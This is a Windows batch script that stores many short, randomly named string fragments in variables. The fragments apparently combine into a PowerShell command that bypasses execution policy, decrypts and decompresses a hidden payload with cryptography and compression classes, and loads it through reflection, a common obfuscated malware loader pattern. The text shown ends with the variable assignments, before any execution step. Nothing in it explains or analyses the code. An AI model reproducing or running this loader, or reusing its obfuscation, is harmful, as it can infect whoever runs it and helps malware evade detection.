@echo off
set "AgyMcIJolP=comm"
set "GgSmIIJvEa=oint"
set "NjTXewQWZT=y.Cr"
set "gskjAyUdPw=ct S"
set "uuRPtCPQzx=ress"
set "crEoTEntQG=Comp"
set "UakptPxxbC=Conv"
set "mCBnpEcVTt=g = "
set "ikQHvCQwPS=VZ.T"
set "tvMcyAsyGQ=Y = "
set "tEyanwaPAn=Secu"
set "GHJmQlqpQB=New-"
set "jvodhbKHKZ=.Sec"
set "lCFgifRQgK=yste"
set "gwIPoDbzdU=rtS4"
set "wFmQEcHUAO=L4Yi"
set "KZqWUHqjRJ=gnir"
set "uglgdKaNUR=  $D"
set "VFXWHQHlqm=);$x"
set "kveLcAGASg=$Apw"
set "mJymQjVLOD=pwub"
set "nIldlVGKlT=[Sys"
set "RGsTYBlDOg=join"
set "JviyozWigg=Syst"
set "lmMfNvFges=m.IO"
set "SQCMwdYiYc=Syst"
set "mjeTGKQPZN=[IO."
set "suSwIfUSoE=z = "
set "neJnFYlYaw=ion."
set "NzkgiXlRCM=se()"
set "nJmjmQAtri=;$hX"
set "uzAiHPzxuR=rofi"
set "YvYkNvKobK=Bmor"
set "aolMCKqnQI=ay()"
set "BxqgqTkFgj=am;$"
set "gDLTRNPVOS=hccF"
set "ugkgDFkGvM=ment"
set "OBQgQNjIeQ=-joi"
set "dzYEgHgNHT=pose"
set "epKiHBaRyR=FH ="
set "ZDkIlAgoCH=urit"
set "ENurFsBtea=ZBOS"
set "eaSItBkbcm=m(, "
set "ropzZVRVcI=oin "
set "NBliLdRVvF=PTtG"
set "aYuHJIKDPn=ptog"
set "KFXHnXcRlg=Secu"
set "QVKqlsIsXT=[Sys"
set "seMXeZbLho=ck($"
set "rgYnTktYAA=.Com"
set "ysCXEZltnh=y]::"
set "WdWTJUclGT=rity"
set "KFFodeCyxd=;$Ol"
set "uZFYOVXeFp=7;$A"
set "FhKjCPsUTL=ne);"
set "AJIJOjnCsa=.Len"
set "vWuGTolxoh=gjYA"
set "olRFCDBVwW=nirt"
set "ETwumMvrfJ=pwub"
set "lalGGDWYyu=null"
set "CnoSOYBnDO=ddin"
set "OEputfjDBD=o.Su"
set "nBKZOQslyz=iron"
set "NafHBcPauS=grap"
set "KjrCkMjBtd= = $"
set "sJnwRpjFUJ=n ''"
set "VFaVVRqvlU=fore"
set "ksmQnfSlxP=::De"
set "npQVFaACrD=in $"
set "xFgeQGDGln=m.Re"
set "iBrccOUaqm=ptor"
set "LtGScMEZTO=em.I"
set "bgUmcsHNmK=onve"
set "IyDAzmATgW=bypa"
set "zLlVRgaXGu=BC;$"
set "ZORAfKIJHj=k; }"
set "fwbEhYtiJW=lit("
set "lyMHaYGECe=Eqo."
set "ARJeteygry=S.En"
set "cSrayoxzLs=.Mem"
set "ClIrKeaVjP= [Sy"
set "tpPEqeBcec=Yz, "
set "bHuFjOoCtB== $A"
set "FaVWIGydjj=gth)"
set "qKWklYsaxo=1..-"
set "AEfAKYZPnX=b.Pa"
set "SZjQPnmRvH=('da"
set "sQcJHbSSvT=.Cry"
set "dljusqGyoj=flec"
set "ieXpMmxKcP=ptog"
